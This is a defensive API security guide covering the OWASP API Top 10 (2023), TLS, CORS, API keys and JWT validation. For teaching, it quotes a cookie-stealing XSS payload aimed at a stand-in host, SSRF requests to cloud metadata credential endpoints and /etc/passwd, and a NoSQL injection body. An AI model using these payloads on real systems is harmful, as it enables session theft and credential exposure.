# API Security

## Summary

API security is the discipline of protecting API endpoints from abuse, unauthorized access, data leakage, and injection attacks. This file covers the OWASP API Security Top 10 (2023 edition) in depth, transport security, input validation, CORS, SSRF, API keys, and security testing. Security is not a feature you add after launch — it is an architectural concern that shapes API design from the start.

---

## OWASP API Security Top 10 (2023)

The 2023 edition reorganized and expanded the 2019 list. Notable changes: BOLA (Broken Object-Level Authorization) remains #1; broken object *property* level authorization was elevated to its own category (#3); unrestricted resource consumption replaced rate limiting as the throttling/abuse category.

### API1:2023 — Broken Object Level Authorization (BOLA / IDOR)

**What it is:** The most common and impactful API vulnerability. An endpoint accepts a user-controlled object identifier and performs an action on that object without verifying that the requesting user has permission to act on that specific object.

**Real-world example pattern:**

```
GET /api/invoices/12345
Authorization: Bearer <user_A_token>
```

User A can modify the invoice ID to `12345` → `12346` and access User B's invoice if the server only checks authentication, not object-level authorization.

**Why APIs are particularly vulnerable:** APIs expose object IDs directly in URL paths and request bodies as a matter of design. This creates an implicit authorization requirement for every endpoint.

**Mitigation:**

```python
# Wrong: checks only authentication
def get_invoice(invoice_id: str, current_user: User):
    return db.get_invoice(invoice_id)  # No ownership check

# Right: checks authorization at the object level
def get_invoice(invoice_id: str, current_user: User):
    invoice = db.get_invoice(invoice_id)
    if invoice.owner_id != current_user.id and not current_user.has_role('admin'):
        raise PermissionDeniedError()
    return invoice
```

Use non-sequential, non-guessable IDs (UUIDs) as a defense-in-depth measure — but this is not a substitute for authorization checks. Sequential integer IDs are enumerable and make BOLA exploitation trivial.

---

### API2:2023 — Broken Authentication

**What it is:** Weak or misconfigured authentication mechanisms that allow attackers to compromise authentication tokens or impersonate users.

**Common failure patterns:**

- Weak JWT secrets (guessable via offline dictionary attacks)
- JWT `alg: none` accepted (no signature validation)
- No rate limiting on `/login` endpoints (credential stuffing)
- Missing token expiration enforcement
- Credentials transmitted over HTTP (not HTTPS)
- Predictable reset tokens

**Mitigations:**

- Enforce HTTPS everywhere (HSTS header)
- Implement rate limiting and account lockout on authentication endpoints
- Use opaque, short-lived access tokens (15–60 min)
- Implement refresh token rotation (issue new refresh token on each use; invalidate old)
- Validate all JWT claims: `iss`, `aud`, `exp`, `iat`, `nbf`

---

### API3:2023 — Broken Object Property Level Authorization (BOPLA)

**What it is:** An API returns more properties of an object than the user is authorized to see (excessive data exposure), OR allows users to modify properties they should not be able to change (mass assignment).

**Excessive data exposure example:**

```json
// Client requests: GET /users/me
// Server returns: (entire User model from ORM)
{
  "id": "u-123",
  "email": "alice@example.com",
  "name": "Alice",
  "role": "admin",          // Should not be exposed to end users
  "passwordHash": "$2b$...", // Critical: must never be exposed
  "stripeCustomerId": "cus_...", // PCI-sensitive
  "internalNotes": "VIP customer, handle with care"
}
```

The vulnerability: developers return the full database model without filtering, trusting that "clients will only use the fields they need."

**Mass assignment example:**

```json
// Client sends:
PATCH /users/me
{
  "name": "Alice Updated",
  "role": "admin"    // Attacker adds this
}

// Server blindly applies all fields from request to model
```

**Mitigations:**

- Define explicit response schemas; never return ORM model directly
- Use DTOs (Data Transfer Objects) with explicit field lists for input and output
- Allowlist permitted fields on update operations — never use dynamic assignment from request body
- Apply field-level authorization when different roles see different fields

---

### API4:2023 — Unrestricted Resource Consumption

**What it is:** API does not limit the size or frequency of resource consumption, enabling DoS through excessive requests, large payloads, or expensive operations.

**Attack vectors:**

- Sending very large JSON bodies (memory exhaustion)
- Triggering expensive database queries via API (complex filter combinations)
- Flooding webhooks or async job queues
- Executing deeply nested GraphQL queries (query complexity attacks)

**Mitigations:**

- **Rate limiting:** Requests per minute per user/IP (token bucket or sliding window)
- **Request size limits:** `Content-Length` enforcement, body size cap (e.g., 1MB max)
- **Query complexity limits (GraphQL):** Assign weights to fields; reject queries above threshold
- **Query depth limits (GraphQL):** Block queries deeper than N levels
- **Timeout enforcement:** Kill slow queries at the API layer, not just DB layer
- **Pagination enforcement:** Require and cap page size; reject requests for more than N records

---

### API5:2023 — Broken Function Level Authorization (BFLA)

**What it is:** API endpoints that perform administrative or sensitive actions are accessible to users who should not have access. Distinct from BOLA: this is about the *function/action* not the *object*.

**Example:** An admin endpoint at `DELETE /admin/users/{id}` or `POST /internal/recalculate-prices` that is unauthenticated or accessible with a regular user token.

**Mitigation:**

- Explicit role checks on every function, not just resource type
- Deny-by-default: all admin endpoints require explicit admin role grant
- Separate admin API surface from user-facing API (different base path, network-level controls)
- Regular access control audits

---

### API6:2023 — Unrestricted Access to Sensitive Business Flows

**What it is:** API enables business logic abuse even with proper authentication — for example, mass account creation for spam, systematic coupon/promo code scraping, scalping limited inventory.

**This is not a technical vulnerability** but a design failure to consider business constraints.

**Mitigations:**

- Device fingerprinting and CAPTCHA on business-critical flows
- Rate limits per user for business actions (not just per endpoint)
- Anomaly detection on usage patterns
- Require phone/email verification before high-value actions

---

### API7:2023 — Server-Side Request Forgery (SSRF)

**What it is:** An API accepts a URL as input and fetches it server-side. Attackers provide URLs pointing to internal services, metadata endpoints, or file system paths.

**Classic attack:**

```
POST /api/webhooks
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name" }
```

This fetches AWS EC2 instance metadata, potentially exposing IAM credentials.

**Other SSRF targets:**

- Internal services: `http://internal-db:5432/`, `http://redis:6379/`
- Cloud metadata: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/`
- File URIs: `file:///etc/passwd`

**Mitigations:**

- Validate URLs before fetching: allowlist allowed domains or IP ranges
- Block requests to RFC 1918 private IP ranges (10.x, 172.16.x, 192.168.x)
- Block requests to link-local (169.254.x) and loopback (127.x)
- Use DNS rebinding protection (re-validate IP after DNS resolution)
- Run URL-fetching code with minimal IAM permissions (principle of least privilege)

---

### API8:2023 — Security Misconfiguration

**What it is:** Insecure defaults, missing hardening, unnecessary features enabled, misconfigured CORS, verbose error messages exposing stack traces.

**Common misconfigurations:**

**CORS misconfiguration:**

```javascript
// Dangerous: reflects origin blindly
app.use(cors({
  origin: (origin, callback) => callback(null, true), // Allows any origin
  credentials: true // Allows cookies — this combination is critical vulnerability
}));

// Safe: explicit allowlist
app.use(cors({
  origin: ['https://app.example.com', 'https://admin.example.com'],
  credentials: true
}));
```

**Missing security headers:**

```
# Required headers
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
```

**Verbose error messages:**

```json
// Wrong — exposes internal paths and library versions
{
  "error": "NullPointerException at com.example.api.UserRepository.findById(UserRepository.java:45)\n\tat com.example.api.UserService.getUser(UserService.java:23)..."
}

// Right — opaque to clients, logged internally
{
  "type": "https://api.example.com/errors/internal",
  "title": "An unexpected error occurred",
  "correlationId": "req-abc123"
}
```

---

### API9:2023 — Improper Inventory Management

**What it is:** Unknown, unpatched, or undocumented API endpoints in production — including shadow APIs, deprecated versions still running, and undocumented test endpoints.

**Why this is serious:** Security patching and monitoring can only cover known surfaces. A forgotten v1 endpoint without rate limiting or updated authentication is a perfect attack vector.

**Mitigations:**

- API inventory/registry as mandatory infrastructure (not optional documentation)
- API gateway enforcement: all traffic routes through the gateway; direct backend access is blocked
- Regular API discovery scans to find undocumented endpoints
- Deprecation processes that actually retire APIs (not just mark them deprecated)

---

### API10:2023 — Unsafe Consumption of APIs

**What it is:** Your API itself consumes third-party APIs. If you trust third-party responses unconditionally, you are vulnerable to injection attacks delivered through third-party data.

**Example:** Your API fetches product data from a third-party feed and renders it. The third party's response contains: `<script>document.location='https://attacker.com/?c='+document.cookie</script>`. If you pass this directly to a client rendering it as HTML, you've facilitated XSS.

**Mitigations:**

- Validate and sanitize data from third-party APIs against your own schema
- Apply the same input validation to third-party responses as you do to client requests
- Don't grant third-party API data elevated trust

---

## Transport Security

### TLS 1.3

TLS 1.3 (2018) is the current minimum. Configuration:

- **Disable TLS 1.0 and 1.1** (both deprecated by RFC 8996)
- **Disable weak cipher suites** (RC4, 3DES, NULL, EXPORT, anon)
- **TLS 1.3 cipher suites** are fixed and non-negotiable — TLS 1.3 removed cipher suite negotiation for good reason

```nginx
# Nginx TLS configuration
ssl_protocols TLSv1.2 TLSv1.3;   # Drop 1.0 and 1.1
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers on;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

### Mutual TLS (mTLS)

mTLS extends TLS by requiring the *client* to present a certificate as well as the server. Both parties authenticate each other at the transport layer.

**Use cases:**

- Service-to-service authentication within a microservices mesh
- B2B APIs where partners have registered certificate fingerprints
- High-security API endpoints (financial, healthcare)
- Zero-trust network implementations

**Implementation in API gateways:**

- Kong: `mtls-auth` plugin
- AWS API Gateway: mutual TLS authentication via truststore S3 bucket
- Istio/Linkerd: automateD mTLS for all service-to-service traffic in the mesh

**Operational challenge:** Certificate rotation. Without automated certificate management (cert-manager in Kubernetes, AWS ACM), mTLS becomes an operational burden. Service meshes (Istio, Linkerd) automate issuance and rotation using SPIFFE/SPIRE identities. This is the primary reason mTLS is practical in service meshes but painful in general API settings.

**mTLS + application-layer auth:** mTLS confirms *who can connect*; application tokens confirm *what they can do*. Defense in depth — use both.

---

## CORS: Correct Configuration

CORS (Cross-Origin Resource Sharing) controls which origins can make browser-based requests to your API.

### How CORS Works

Browser makes a preflight `OPTIONS` request before actual requests with:

- Custom headers
- Non-simple methods (PUT, DELETE, PATCH)
- `Content-Type: application/json`

```
OPTIONS /api/orders HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

Server must respond:

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

### The Critical Misconfiguration

**`Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`** — browsers refuse this combination (correct behavior), but many APIs incorrectly reflect the request origin header:

```javascript
// VULNERABLE
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // Reflects any origin
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
```

This allows any website to make credentialed requests to your API using a logged-in user's cookies.

**Correct pattern:**

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean));

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Vary', 'Origin'); // Critical for caching correctness
    res.header('Access-Control-Allow-Credentials', 'true');
  }
  next();
});
```

---

## API Key Best Practices

API keys are the simplest API authentication mechanism. Used correctly:

**Format:** Prefix + random bytes. Prefix enables identification without exposing the key:

```
sk_live_4K8mX9P2nQ7rV3wY1hE6   # Stripe-style
pk_live_...                      # Stripe publishable key (different prefix = different permissions)
```

The prefix `sk_live_` tells you: secret key, live mode. This allows:

- Database queries by prefix (without storing the full key)
- Identifying leaked keys in code repositories
- Distinguishing environments (`sk_test_` vs `sk_live_`)

**Storage:** Hash the key in the database (bcrypt or SHA-256). Return the full key only once at creation time; store only the hash. Never store plaintext API keys.

```sql
CREATE TABLE api_keys (
  id UUID PRIMARY KEY,
  prefix VARCHAR(16),         -- Stored plaintext (e.g., "sk_live_4K8mX9")
  key_hash VARCHAR(64),       -- SHA-256 hash of full key
  description TEXT,
  scopes TEXT[],              -- ["read:orders", "write:orders"]
  created_at TIMESTAMP,
  last_used_at TIMESTAMP,
  expires_at TIMESTAMP,       -- NULL = no expiration
  revoked_at TIMESTAMP        -- NULL = active
);
```

**Scoping:** API keys should have minimal scopes required for their purpose. An analytics key needs only `read:*`; a webhook key needs only `write:events`.

**Rotation:** Provide mechanisms for key rotation without downtime — accept both old and new key during a grace period.

**Rotation detection:** Alert on unusual usage patterns (geo anomalies, volume spikes, off-hours access) that suggest a compromised key.

---

## JWT Security

### The Attacks and Defenses

**`alg: none` attack:**

An attacker modifies the JWT header to `"alg": "none"`, removes the signature, and the server accepts it without validation if the library has this enabled.

Mitigation:

```javascript
// Always specify allowed algorithms explicitly
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
// Never use: jwt.verify(token, publicKey) — uses header's alg claim
```

**Algorithm confusion (RS256 → HS256):**

The server uses RS256 (asymmetric). The public key is available (it's public). An attacker crafts a token, signs it with HS256 using the public key as the HMAC secret. A vulnerable server that accepts both RS256 and HS256 validates this token against the public key — successfully, because that's exactly how HS256 works with that "secret."

CVE-2024-54150 is a recent example of this class in a widely-used library.

Mitigation: Whitelist the algorithm. Never allow multiple algorithm types for the same key pair.

**Weak secret attacks (HS256):**

HS256 with a short or guessable secret is crackable offline. `hashcat` can brute-force HS256 JWTs.

Mitigation: Use at least 256 bits of entropy for HS256 secrets (32 random bytes from a CSPRNG). Or switch to RS256/ES256 (asymmetric) which have no secret to crack.

**Correct JWT validation sequence:**

```python
def validate_jwt(token: str) -> Claims:
    # 1. Decode header without validation (to get kid/alg)
    header = jwt.get_unverified_header(token)
    
    # 2. Verify algorithm is in our allowlist
    if header['alg'] not in ALLOWED_ALGORITHMS:
        raise InvalidTokenError("Unsupported algorithm")
    
    # 3. Fetch the correct key (by kid if using key rotation)
    key = key_store.get(header.get('kid', 'default'))
    
    # 4. Verify signature and standard claims
    claims = jwt.decode(
        token, 
        key,
        algorithms=[header['alg']],  # Explicit algorithm
        audience='api.example.com',   # Validate aud
        issuer='auth.example.com',    # Validate iss
        options={"verify_exp": True, "verify_iat": True}
    )
    
    return claims
```

---

## Rate Limiting as a Security Control

Rate limiting is discussed in depth in `12_performance_scaling.md`, but it serves a critical security function beyond scaling:

- **Brute force protection:** Limit authentication attempts per IP and per account
- **Credential stuffing prevention:** Slow down or block distributed attacks across many IPs
- **Account enumeration prevention:** Rate limit `POST /reset-password` to prevent discovery of registered emails
- **DoS prevention:** Limit resource-intensive endpoints more aggressively

**Security-specific rate limit examples:**

```
POST /auth/login:         5 attempts/minute per IP, 10 per account per hour
POST /auth/reset-password: 3 attempts/hour per email address
GET /users?email=:        100 requests/minute (enumeration risk)
POST /payments:           50 per user per hour
```

---

## Input Validation and Injection

**Validation should happen at the trust boundary** — when data enters your system from outside. Do not defer validation to the database.

**Schema validation as the first defense:**

```python
from pydantic import BaseModel, EmailStr, constr

class CreateUserRequest(BaseModel):
    email: EmailStr                     # Validates email format
    name: constr(min_length=1, max_length=100, strip_whitespace=True)
    role: Literal['user', 'admin']      # Only allowed values
    age: int = Field(ge=0, le=150)      # Range validation
```

**Parameter pollution:** `GET /users?role=user&role=admin` — some frameworks return both values as an array. Validate that singular parameters are indeed singular.

**NoSQL injection:** `{ "username": { "$gt": "" } }` — MongoDB operators in JSON bodies. Sanitize or validate that values are the expected type before passing to the database layer.

**SQL injection:** Use parameterized queries. Never interpolate user input into SQL strings. This is table-stakes security, not optional.

---

## API Fuzzing and Security Testing

**Schemathesis:** Property-based testing against OpenAPI spec. Automatically generates test cases that explore edge cases the spec allows.

```bash
schemathesis run openapi.yaml --checks all --target response_time
# Generates: null values, boundary integers, large strings, malformed emails
# Checks: response conforms to schema, no 500 errors, response time < limit
```

**OWASP ZAP API scan:**

```bash
docker run -v $(pwd):/zap/wrk -t ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py -t http://api.example.com/openapi.json \
  -f openapi -r zap_report.html
```

**42Crunch API Security Audit:** Static analysis of OpenAPI specs for security issues — finds insecure schema definitions, missing auth requirements, exposed PII before deployment.

**Escape:** Dynamic API security testing that uses your OpenAPI spec to generate security-focused test cases.

---

## Key References

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP BOLA (API1:2023)](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [RFC 8996: Deprecating TLS 1.0 and 1.1](https://datatracker.ietf.org/doc/html/rfc8996)
- [JWT Algorithm Confusion CVE-2024-54150 — PentesterLab](https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150)
- [PortSwigger: JWT Algorithm Confusion Attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [Cloudflare mTLS Documentation](https://developers.cloudflare.com/api-shield/security/mtls/)
- [Schemathesis — Property-Based API Testing](https://schemathesis.readthedocs.io/)
- [42Crunch API Security Audit](https://42crunch.com/api-security-audit/)
- [OWASP ZAP](https://www.zaproxy.org/)
- [CORS Misconceptions — Phil Sturgeon](https://phil.tech/2018/cors-api-mistakes/)
- [Stripe API Security Practices](https://stripe.com/docs/security)
